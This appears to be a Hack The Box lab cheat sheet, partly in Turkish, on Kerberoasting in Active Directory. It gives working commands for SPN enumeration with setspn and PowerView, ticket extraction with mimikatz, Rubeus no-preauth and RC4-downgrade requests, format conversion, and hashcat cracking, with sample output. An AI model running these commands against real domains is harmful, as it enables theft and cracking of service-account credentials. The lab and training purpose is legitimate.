# Kerberoasting

!!! warning

    Çoğu servis rastgele üretilmiş parolalara sahip bilgisayar hesapları tarafından yürütülür. Bu durum hash kırma aşamasını anlamsız hale getirir.

    * [ ] Servis yürütmek için kullanılan hesap: Bilgisayar
    * [x] Servis yürütmek için kullanılan hesap: Kullanıcı

## Requirements

1. DC.
2. Domain katılımlı bir hesaba ait kimlik bilgileri.

## Enumeration

### Using [setspn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn)

```pwsh
PS C:\Users\htb-student> setspn -Q */*
```


### Using PowerView

```pwsh
PS C:\Users\htb-student> Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
```

```output title="Output" hl_lines="9"
serviceprincipalname                    samaccountname
--------------------                    --------------
kadmin/changepw                         krbtgt
MSSQL_svc_dev/inlanefreight.local:1433  sqldev
MSSQLSvc/SQL01:1433                     sqlprod
MSSQL_svc_qa/inlanefreight.local:1433   sqlqa
MSSQL_svc_test/inlanefreight.local:1433 sql-test
IIS_dev/inlanefreight.local:80          adam.jones
SVC/FILER02.inlanefreight.local         jacob.kelly
```

## Performing the Attack

### Manual Method

#### Requesting a TGS Ticket

```pwsh
PS C:\Users\htb-student> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\htb-student> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SVC/FILER02.inlanefreight.local"
```

```output title="Output"
Id                   : uuid-3fa9cc93-bc68-454d-9115-791d20344b1e-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 5/24/2025 7:55:22 PM
ValidTo              : 5/25/2025 5:34:07 AM
ServicePrincipalName : SVC/FILER02.inlanefreight.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

#### Extracting Tickets

```pwsh
PS C:\Users\htb-student> C:\Tools\mimikatz.exe "base64 /out:true" "kerberos::list /export" exit
```

```output title="Output" hl_lines="52"

   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
```

#### To Kirbi

```sh
my@attack:~$ tr -d '\n' < jacob.kelly.base64 | base64 -d > jacob.kelly.kirbi
```

#### [To John](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py)

```sh
my@attack:~$ python2 ./kirbi2john.py jacob.kelly.kirbi
```

#### To Hashcat

```sh
my@attack:~$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > jacob.kelly.hash
```

### PowerView

#### Invoke-Kerberoast

```pwsh
PS C:\Users\htb-student> Invoke-Kerberoast
```

### Rubeus (DONT_REQ_PREAUTH)

!!! warning

    Kerberos pre-authentication devre dışı olmalıdır.

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe kerberoast /nopreauth:amber.smith /domain:INLANEFREIGHT.LOCAL /spn:MSSQL_svc_dev/INLANEFREIGHT.LOCAL:1433 /nowrap
```

```output title="Output" hl_lines="5"
[*] Action: Kerberoasting

[*] Using amber.smith without pre-auth to request service tickets

[*] Target SPN             : MSSQL_svc_dev/INLANEFREIGHT.LOCAL:1433
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Hash                   : $krb5tgs$23$*MSSQL_svc_dev/INLANEFREIGHT.LOCAL:1433$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/INLANEFREIGHT.LOCAL:1433*$D095F2F23F571AB5FA5A3ADE39A917B3$
```

### Rubeus ([tgtdeleg](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#tgtdeleg))

#### [Supported Encryption Types](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919)

| VALUE | ENCRYPTION TYPE |
|---|---|
| 0 | RC4-HMAC |
| 1 | DES-CBC-CRC |
| 2 | DES-CBC-MD5 |
| 4 | RC4-HMAC |
| 8 | AES128-CTS-HMAC-SHA1-96 |
| 16 | AES256-CTS-HMAC-SHA1-96 |

```pwsh
PS C:\Users\htb-student> Get-DomainUser -Identity jacob.kelly -Properties msds-supportedencryptiontypes
```

```output title="Output"
msds-supportedencryptiontypes
-----------------------------
                           24
```

#### Downgrading to RC4

!!! failure

    Windows Server 2019 üzerinde işe yaramaz.

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe kerberoast /tgtdeleg /user:jacob.kelly /nowrap
```

```output title="Output" hl_lines="3-4 17"

[*] Using 'tgtdeleg' to request a TGT for the current user
```

## Cracking the Hash

```sh
my@attack:~$ hashcat --hwmon-disable -a 0 -m 13100 jacob.kelly.hash /usr/local/share/wordlists/rockyou.txt
```
